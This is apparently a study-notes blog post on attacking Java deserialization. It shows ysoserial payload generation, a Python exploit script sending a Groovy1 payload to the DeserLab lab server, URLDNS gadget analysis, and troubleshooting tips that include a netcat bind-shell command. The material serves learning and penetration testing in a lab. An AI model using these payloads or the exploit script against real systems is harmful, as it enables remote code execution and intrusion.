<p>Several <strong>Burpsuite Pro</strong> extensions have been developed in order to make Java serialization detection and exploitation easier.</p>

<ul>
  <li>Freddy, Deserialization Bug Finder</li>
  <li>Java Deserialization Scanner</li>
</ul>

<p>When approaching an application that utilizes serialized java data, we don’t know what libraries are used by the back end. In such a case, a brute-force approach might be rewarding.</p>

<p>Assume that payloads.txt contains <strong>ALL ysoserial payload names</strong>, one per line</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">while</span> <span class="nx">read</span> <span class="nx">payload</span><span class="p">;</span>
<span class="k">do</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">en</span> <span class="dl">"</span><span class="s2">$payload</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">java</span> <span class="o">--</span><span class="nx">add</span><span class="o">-</span><span class="nx">opens</span> <span class="nx">java</span><span class="p">.</span><span class="nx">base</span><span class="o">/</span><span class="nb">sun</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">annotation</span><span class="o">=</span><span class="nx">ALL</span><span class="o">-</span><span class="nx">UNNAMED</span> <span class="o">-</span><span class="nx">jar</span> <span class="nx">ysoserial</span><span class="o">-</span><span class="nx">all</span><span class="p">.</span><span class="nx">jar</span> <span class="nx">$payload</span> <span class="dl">"</span><span class="s2">whoami</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">|</span> <span class="nx">tr</span> <span class="o">-</span><span class="nx">d</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span> <span class="o">&gt;</span>
<span class="nx">payloads</span><span class="o">/</span><span class="nx">$payload</span><span class="p">.</span><span class="nx">ser</span>
<span class="nx">echo</span> <span class="o">-</span><span class="nx">en</span> <span class="dl">"</span><span class="s2">--------------------------------</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">;</span> <span class="nx">done</span> <span class="o">&lt;</span> <span class="nx">payloads</span><span class="p">.</span><span class="nx">txt</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The result file can be further used in <strong>Burp Intruder</strong> attacks. However, some of the payloads cause ysoserial to throw an error. This is because some payload names must be used in a specific way.</p>

<ul>
  <li>
    <p><a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/exploit">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/exploit</a></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2025.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>Each of the .java files can be run as a separate java class, resulting in executing different code by the ysoserial tool. For example, based on the <strong>names of the Java classes</strong> that ysoserial contain, we can infer what they were built for</p>

<p>A jar file, the format in which ysoserial is shipped, is a regular zip archive that can be unpacked. Due to this feature of Java, it’s possible to select and invoke a single method out of a jar archive.</p>

<p>In order to do that, we need to use the command line java utility with the <strong><code class="language-plaintext highlighter-rouge">-cp</code></strong> (classpath) argument. So if we wanna use the <code class="language-plaintext highlighter-rouge">JSF.java</code> module, we need to issue the following command line</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -cp ysoserial-all.jar ysoserial.exploit.JSF</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2026.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2026.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The JSF payload can be used to attack serialization in Java Face’s <strong>VIEWSTATE</strong> parameter</p>

<h3 id="5º-exploiting-java-deserialization"><span class="me-2"><strong><em>5º Exploiting Java Deserialization</em></strong></span><a href="#5º-exploiting-java-deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>Vulnerable environment: https://github.com/NickstaDB/DeserLab</em></p>

<p><strong>Target Machine</strong></p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar DeserLab.jar -server 192.168.83.129 4430</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2027.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2027.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p><strong>Attacker Machine</strong> - try to just connect to the endpoint</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">nc 192.168.83.129 4430</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2028.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2028.png" alt="Untitled" loading="lazy"></a></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2029.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2029.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>So try to use DeserLab’s client functionality to see if the connection will behave differently</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar DeserLab.jar -client 192.168.83.129 4430</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2030.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2030.png" alt="Untitled" loading="lazy"></a></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2031.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2031.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>Can use Wireshark dump to see the Java serialized data in the communication</p>

<ul>
  <li>
    <p>Wireshark &amp; Filter for <code class="language-plaintext highlighter-rouge">tcp.dstport == 4430</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2032.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2032.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>In order to avoid manual revision of all the packets sent, the <strong>tshark</strong> tool can be used to spot the beginning of the serialization stream</p>

<p>save the Wireshark dump as <strong><code class="language-plaintext highlighter-rouge">deserialization.pcap</code></strong></p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">tcpdump -r deserialization.pcapng 'host 192.168.83.129 and host 192.168.83.128' -w finaldeserialization.pcap</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">tshark -r deserialization.pcapng -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^4430,' | cut -d ',' -f2 | tr '\n' ':' | sed s/://g</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2033.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2033.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>For every object / value transported in Java serialized data, there’s a preceding byte of certain value that identifies its type.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>0x70</th>
      <th>TC_NULL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x71</td>
      <td>TC_REFERENCE</td>
    </tr>
    <tr>
      <td>0x72</td>
      <td>TC_CLASSDESC</td>
    </tr>
    <tr>
      <td>0x73</td>
      <td>TC_OBJECT</td>
    </tr>
    <tr>
      <td>0x74</td>
      <td>TC_STRING</td>
    </tr>
    <tr>
      <td>0x75</td>
      <td>TC_ARRAY</td>
    </tr>
    <tr>
      <td>0x76</td>
      <td>TC_CLASS</td>
    </tr>
    <tr>
      <td>0x77</td>
      <td>TC_BLOCKDATA</td>
    </tr>
    <tr>
      <td>0x78</td>
      <td>TC_ENDBLOCKDATA</td>
    </tr>
    <tr>
      <td>0x79</td>
      <td>TC_RESET</td>
    </tr>
    <tr>
      <td>0x7A</td>
      <td>TC_BLOCKDATALONG</td>
    </tr>
    <tr>
      <td>0x7B</td>
      <td>TC_EXCEPTION</td>
    </tr>
    <tr>
      <td>0x7C</td>
      <td>TC_LONGSTRING</td>
    </tr>
    <tr>
      <td>0x7D</td>
      <td>TC_PROXYCLASSDESC</td>
    </tr>
    <tr>
      <td>0x7E</td>
      <td>TC_ENUM</td>
    </tr>
  </tbody>
</table></div>

<p>Can inspect <strong>any Java serialized stream</strong> to identify the object it contains using the <a href="https://github.com/NickstaDB/SerializationDumper"><strong>Java Serialization Dumper</strong></a> tool</p>

<p>Also, can build the tool using the supplied <a href="http://build.sh"><strong>build.sh</strong></a> script. The tool’s usage is straightforward, as the tool takes just a hex representation of serialized bytes and dumps the objects the byte stream consists.</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar SerializationDumper.jar aced00057704f000baaa77020101737200146e622e646573657265486173682657175657374e52ce9a92ac1f991020024c000a64617461546f48617368007472696e673b4c00077468654861736871007e0001787074000a74657374737472696e6774002064363763356532636535623031633939663933265333864656636535638</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2034.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2034.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The tool dumps <strong>every object</strong> that is contained within the serialized stream.</p>

<p>The simple netcat listener/client was not enough to start a <code class="language-plaintext highlighter-rouge">,,serialized conversation"</code> since lots of serialized objects were sent to the target.</p>

<p>You might also want to study the source code of the tool to see where certain parts of the serialized stream were generated and sent.</p>

<p>But how can we got from <strong>replacing single objects to</strong> <strong>executing code</strong>?</p>

<ul>
  <li>Build a  python script that will mimic the initial serialized handshake - 0xaced0005</li>
  <li>Replace the serialized data - the string hash, with the <strong>ysoserial</strong> payload</li>
</ul>

<p>Based on the output of <code class="language-plaintext highlighter-rouge">Serialization Dumper</code> part of the communication must be mimicked using python. This includes the handshake, 2 <code class="language-plaintext highlighter-rouge">TC_BLOCKDATA</code> structures and the username.</p>

<p>The final payload is generated using <strong>Groovy library</strong> is chosen since it’s utilized by DeserLab.</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar ysoserial-all.jar Groovy1 "ping 192.168.83.129" &gt; p.bin</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2035.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2035.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The payload contains the java serialization signature in the beginning <code class="language-plaintext highlighter-rouge">ac ed 00 05</code></p>

<p>Since the serialized conversation is already started, we should remove it from the payload. That’s why in the exploit, you’ll see the <strong>ysoserial</strong> payload being shortened by removing the first 4 bytes.</p>

<p><strong>Exploit.py -</strong> <em>it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the ysoserial payload without its first 4 bytes <code class="language-plaintext highlighter-rouge">aced0005</code></em></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">socket</span>

<span class="nx">ip</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">192.168.83.129</span><span class="dl">"</span>
<span class="nx">port</span> <span class="o">=</span> <span class="mi">4430</span>
<span class="nx">payload</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">p.bin</span><span class="dl">"</span>

<span class="nx">s</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="nx">socket</span><span class="p">.</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">SOCK_STREAM</span><span class="p">)</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="nx">ip</span><span class="p">,</span><span class="nx">port</span><span class="p">))</span>

<span class="nx">data</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">xac</span><span class="se">\</span><span class="s1">xed</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x05</span><span class="dl">'</span> <span class="err">#</span> <span class="nx">Serialization</span> <span class="nx">handshake</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>

<span class="nx">data</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x04</span><span class="dl">'</span>
<span class="nx">data2</span><span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">xf0</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">xba</span><span class="se">\</span><span class="s1">xaa</span><span class="dl">'</span> <span class="err">#</span> <span class="nx">TC_BLOCKDATA</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data2</span><span class="p">)</span>

<span class="nx">data</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x02</span><span class="dl">'</span> <span class="err">#</span> <span class="nx">Protocol</span> <span class="nx">version</span>
<span class="nx">data2</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x01</span><span class="se">\</span><span class="s1">0x1</span><span class="dl">'</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data2</span><span class="p">)</span>

<span class="nx">data</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x06</span><span class="dl">'</span> <span class="err">#</span> <span class="nx">depends</span> <span class="nx">on</span> <span class="nx">username</span> <span class="mi">06</span> <span class="nx">is</span> <span class="nx">string</span> <span class="nx">lenght</span> <span class="o">+</span><span class="mi">2</span>
<span class="nx">data2</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x04</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x74</span><span class="dl">'</span> <span class="err">#</span> <span class="mi">00</span> <span class="mi">04</span> <span class="nx">is</span> <span class="nx">string</span> <span class="nx">lenght</span><span class="p">,</span> <span class="nx">the</span> <span class="mi">4</span> <span class="nx">bytes</span> <span class="nx">T</span> <span class="nx">E</span> <span class="nx">S</span> <span class="nx">T</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nx">data2</span><span class="p">)</span>

<span class="nx">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="dl">"</span><span class="s2">rb</span><span class="dl">"</span><span class="p">)</span> <span class="nx">#ysoserial</span> <span class="nx">payload</span> <span class="nx">without</span> <span class="nx">first</span> <span class="mi">4</span> <span class="nx">bytes</span>
<span class="nx">c</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
<span class="nx">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="mi">4</span><span class="p">:])</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">exploit.py</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2036.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2036.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<h3 id="6º-analysis-of-urldns-payload"><span class="me-2"><strong><em>6º Analysis of URLDNS Payload</em></strong></span><a href="#6º-analysis-of-urldns-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The payload doesn’t result in code execution.</p>

<p>It makes the deserializing endpoint <strong>resolve an arbitrary DNS name</strong>.</p>

<p>This is rather a low-impact result of insecure deserialization, but on the other hand it uses <strong>Java built-in features</strong>, so it’s likely to work <strong>almost every case</strong>.</p>

<p>Allows for <strong>easier confirmation</strong> of insecure deserialization.</p>

<p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="c1">// This code is called when the payload is created</span>
<span class="kr">public</span> <span class="nb">Object</span> <span class="nf">getObject</span><span class="p">(</span><span class="nx">final</span> <span class="nb">String</span> <span class="nx">url</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>

    <span class="c1">// Avoid DNS resolution during payload creation</span>
    <span class="nx">URLStreamHandler</span> <span class="nx">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SilentURLStreamHandler</span><span class="p">();</span>

    <span class="c1">// Create the HashMap that will contain the URL</span>
    <span class="c1">// HashMap.readObject() -&gt; HashMap ht = new HashMap()</span>
    <span class="nx">HashMap</span> <span class="nx">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="p">();</span> <span class="c1">// This method is called during the deserialization of the HashMap object</span>

    <span class="c1">// Create the URL to use as a key in the HashMap</span>
    <span class="c1">// HashMap.putVal()</span>
    <span class="nx">URL</span> <span class="nx">u</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">handler</span><span class="p">);</span> <span class="c1">// The URL is used as a key in the HashMap</span>

    <span class="c1">// Adding the URL as a key and any serializable value to the HashMap</span>
    <span class="c1">// HashMap.putVal()</span>
    <span class="nx">ht</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span> <span class="c1">// During deserialization, HashMap.putVal() is called</span>

    <span class="c1">// Reconfigure the URL's hashCode</span>
    <span class="nx">Reflections</span><span class="p">.</span><span class="nf">setFieldValue</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="dl">"</span><span class="s2">hashCode</span><span class="dl">"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Resets the hashCode so that the next call to hashCode() triggers DNS resolution</span>

    <span class="k">return</span> <span class="nx">ht</span><span class="p">;</span> <span class="c1">// Returns the HashMap to be used as the payload</span>
<span class="p">}</span>

<span class="c1">// This class is used to avoid DNS resolution during object creation</span>
<span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="nc">URLStreamHandler</span> <span class="p">{</span>

    <span class="kr">protected</span> <span class="nx">URLConnection</span> <span class="nf">openConnection</span><span class="p">(</span><span class="nx">URL</span> <span class="nx">u</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kr">protected</span> <span class="nx">synchronized</span> <span class="nx">InetAddress</span> <span class="nf">getHostAddress</span><span class="p">(</span><span class="nx">URL</span> <span class="nx">u</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// During the deserialization of the object on the target:</span>
    <span class="c1">// 1. HashMap.readObject()</span>
    <span class="c1">// 2. HashMap.putVal()</span>
    <span class="c1">// 3. HashMap.hash()</span>
    <span class="c1">// 4. URL.hashCode() -&gt; DNS resolution occurs here</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">HashMap</code> is a Java data type that stores data in key-value pairs.</p>

<p>The <code class="language-plaintext highlighter-rouge">HashMap</code> contains a hashed URL object, which due to java built-in mechanisms, will be arbitrarily resolved.</p>

<p>The serialized object to be sent to the target is crafted in the public method <code class="language-plaintext highlighter-rouge">getObject</code> that returns an Object → <em>serialized payload.</em></p>

<ol>
  <li><strong>Payload Creation</strong>: A special object is created using a class <code class="language-plaintext highlighter-rouge">URLDNS</code>.</li>
  <li><strong>Use of <code class="language-plaintext highlighter-rouge">HashMap</code></strong>: The malicious object uses a <code class="language-plaintext highlighter-rouge">HashMap</code>, which is a Java data structure that stores data in key-value pairs.</li>
  <li><strong>URL Manipulation</strong>: The <code class="language-plaintext highlighter-rouge">HashMap</code> contains a key that is a <code class="language-plaintext highlighter-rouge">URL</code> object. The <code class="language-plaintext highlighter-rouge">URL</code> class in Java has a special behavior: when the <code class="language-plaintext highlighter-rouge">hashCode()</code> method is called, it tries to resolve the DNS address of the URL.</li>
  <li><strong>Avoid Initial Resolution</strong>: A custom URL handler (<code class="language-plaintext highlighter-rouge">SilentURLStreamHandler</code>) is used to avoid DNS resolution when the object is created.</li>
  <li><strong>Force Resolution on Deserialization</strong>: When the <code class="language-plaintext highlighter-rouge">HashMap</code> is deserialized, it recalculates the <code class="language-plaintext highlighter-rouge">hashCode()</code> of the URL, forcing a new DNS resolution.</li>
</ol>

<p><strong>Practical Example</strong></p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar ysoserial-all.jar URLDNS [http://somethingnonexistent.com](http://somethingnonexistent.com/) &gt; p.bin</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2037.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2037.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p><em>In the Burp Suite Pro - can use Burp Collaborator Client in order to generate and catch DNS requests</em></p>

<ul>
  <li>
    <p>[<strong><code class="language-plaintext highlighter-rouge">DNSChief</code>](https://github.com/iphelix/dnschef) →</strong> <em>For poc</em></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">nvim /etc/resolv.conf</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2038.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2038.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">./dnschef.py</code>
<code class="language-plaintext highlighter-rouge">ping nonexistentdomain1231aeqqsa.com</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2039.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2039.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">python3 exploit.py</code> → <em>Can see that the lookup is performed</em></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2040.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2040.png" alt="Untitled" loading="lazy"></a></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2041.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2041.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p><code class="language-plaintext highlighter-rouge">URLDNS</code> can be used to detect deserialization issues <strong>before</strong> you can try to attack them with full-RCE payloads.</p>

<h3 id="7º-troubleshooting-ysoserial"><span class="me-2"><strong><em>7º Troubleshooting Ysoserial</em></strong></span><a href="#7º-troubleshooting-ysoserial" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>Be aware that for different reasons the code execution payloads can fail when using <strong>ysoserial</strong>.</em></p>

<p><em>When attacking a serialization mechanism using <strong>ysoserial</strong> and aiming for code executions, lots of exceptions might occur.</em></p>

<p><em>In order to be able to confirm whether the application is secure or not, you should be familiar with the <strong>exception types</strong> that can be thrown during the attacking process.</em></p>

<p><em><strong>Ysoserial</strong> is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface.</em></p>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">ClassNotFoundException</code> →</strong> <em>Target application <strong>doesn`t</strong> utilize the <strong>gadget library</strong> used by the ysoserial.</em></li>
  <li><strong><code class="language-plaintext highlighter-rouge">java.io.IOException</code> + “</strong>,,Cannot run program<em>*” → *Good sign** the payload worked.</em></li>
</ul>

<p>Create an RCE-related payload, be aware of its limitations:</p>

<ul>
  <li>Output redirects and pipes are not supported</li>
  <li>Parameters to the command cannot contain spaces
    <ul>
      <li><code class="language-plaintext highlighter-rouge">nc -lp 4444 -e /bin/sh</code> → <em>Okay</em></li>
      <li><code class="language-plaintext highlighter-rouge">python -c import socket; ...</code> → <em>Won’t work because the parameter (import socket) to Python contains a space</em></li>
    </ul>
  </li>
</ul>

<h3 id="credits"><span class="me-2">Credits</span><a href="#credits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><a href="https://elearnsecurity.com">eLearnSecurity</a></li>
  <li><a href="https://crowsec.com.br/">Crowsec</a></li>
  <li><a href="https://hackerone.com/">HackerOne</a></li>
  <li><a href="https://owasp.org">OWASP</a></li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
    <div class="post-meta mb-3">
      <i class="far fa-folder-open fa-fw me-1"></i>
      
      <a href="/categories/study/">Study</a>,
      <a href="/categories/attack-serialization/">Attack Serialization</a>
    </div>
    

    <!-- tags -->
    

    <div class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      ">
      <div class="license-wrapper">
        
        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Understanding%20Attack%20Serialization:%20An%20Introduction%20-%20&url=http%3A%2F%2F0.0.0.0%3A3000%2Fposts%2FAttacking-Serialization%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Understanding%20Attack%20Serialization:%20An%20Introduction%20-%20&u=http%3A%2F%2F0.0.0.0%3A3000%2Fposts%2FAttacking-Serialization%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2F0.0.0.0%3A3000%2Fposts%2FAttacking-Serialization%2F&text=Understanding%20Attack%20Serialization:%20An%20Introduction%20-%20" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Proving-Grounds-Fractal/">Proving Grounds - Fractal</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Proving-Grounds-Squid/">Proving Grounds - Squid</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Proving-Grounds-Twiggy/">Proving Grounds - Twiggy</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Proving-Grounds-Exfiltrated/">Proving Grounds - Exfiltrated</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Proving-Grounds-ClamAV/">Proving Grounds - ClamAV</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
